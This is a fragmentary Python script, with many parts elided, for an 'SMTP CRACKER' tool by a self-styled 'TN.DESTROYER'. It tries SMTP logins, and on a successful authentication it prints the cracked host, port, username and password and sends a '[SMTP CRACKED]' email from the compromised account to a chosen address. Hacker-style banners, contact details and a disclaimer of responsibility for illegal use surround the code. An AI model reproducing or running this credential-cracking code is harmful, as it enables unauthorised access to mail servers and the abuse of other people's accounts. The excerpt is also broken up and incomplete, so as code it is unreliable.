...
# -*- coding: utf-8 -*-
#Coded TN.DESTROYER 
# PRIVATE TOOL 2019/2020 #PLEASE DONT LEAK THE SCRIPT
...
try:
  if os.name=='nt':
   ...
   os.system('clear')
    ...
    print("\033[91mERROR :| \nCONTACT TN.DESTROYER FOR TOOLS!\033[00m")
msg0 ="\033[########## Verifying Modules ########"
for i in msg0:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)
try: 
 import Queue
  ...
  print"\033[91m[\033[92m?\033[91m] Installing Queue Modules\033[00m"
  if os.name=='nt':
    try:
...
def aron():
 try:
  if os.name=='nt':
   os.system('cls && cd SMTP-Mail.acess-Cracker-Checker && smtp.py')
  else:
   os.system('clear && cd SMTP-Mail.acess-Cracker-Checker && python2 smtp.py')
 except:
    print("\033[91mERROR :| \nCONTACT TN.DESTROYER For More Tools !\033[00m")
to_check={}
	...
	def connect(self,tupple,ssl=False):
		...
		try:
			...
			if rez[0:3]!="235" or 'fail' in rez:
				...
				s.close()
				return 0
   			print '\n\033[93m[\033[90m>\033[00m]\033[91m Cracked Successfuly... >\033[97m '+host+':'+port+' '+user+' '+passw+'\n'
			...
			headers='From: <'+user+'> TN-DESTROYER\r\n'
			headers+='To: '+email+'\r\n'
			headers+='Reply-To: '+email+'\r\n'
			headers+='Subject: [SMTP CRACKED] User-ID Num: ['+randomString+']\r\n'
...
<body>
	<center>
		<br><br><br>
		<h1>[+]SMTP CRACKER TOOL [+]</h1> <br>
		<font color="#f16f6f"><h1>[ ! ] AUTHOR : TN.DESTROYER [ ! ]</h1></font><br><br><br>
		<font size="6" color="red">/!\ STMP INFORMATION /!\ <br><font color="red" size="6" ><"/">i don't accept any responsibility for any illegal usage !</font><"/"></font><br><br>
		...
		<font color="black" size="5" ><font color="red">CONTACT :</font> tn.destroyer007@gmail.com <br><br></font>
		<h2>© TN.DESTROYER 2019</h2>
	</body>
	</html>\r\n.\r\n'''
			s.send(headers)
			rez=s.recv(1000)
...
try:
 ...
 pass
save=open('about.txt','a').write('Hello \n Welcome Again STMP CRACKER Available \n [+] CODED By TN.DESTROYER \n Thanks To My Friend #Leet1337 \n [*] Facebook > fb.com/omega.game04 \n [*]')
...
(.-./`-'\.-.)  \033[93m$$    $$/ $$ | $/  $$ |   $$ |   $$ |       \033[0;96m(.-./`-'\.-.) 
 `-'     `-'    \033[93m$$$$$$/  $$/      $$/    $$/    $$/         \033[0;96m`-'     `-'
               \033[91m[\033[92m+\033[91m]\033[1m CODED BY :    TN.DESTROYER     \033[91m [\033[92m+\033[91m]
              \033[91m[\033[92m+\033[91m]\033[95m SMTP CRACKER 2019 TN.DESTROYER     \033[91m[\033[92m+\033[91m]
             \033[91m[\033[92m+\033[91m]\033[92m   Mail :tn.destroyer007gmail.com     \033[91m[\033[92m+\033[91m]
            \033[91m[\033[92m+\033[91m]\033[94m Facebook > Fb.com/omega.game04         \033[91m[\033[92m+\033[91m]
           \033[91m[\033[92m+\033[91m]            Thanks For Using My Tool      \033[91m[\033[92m+\033[91m]''')
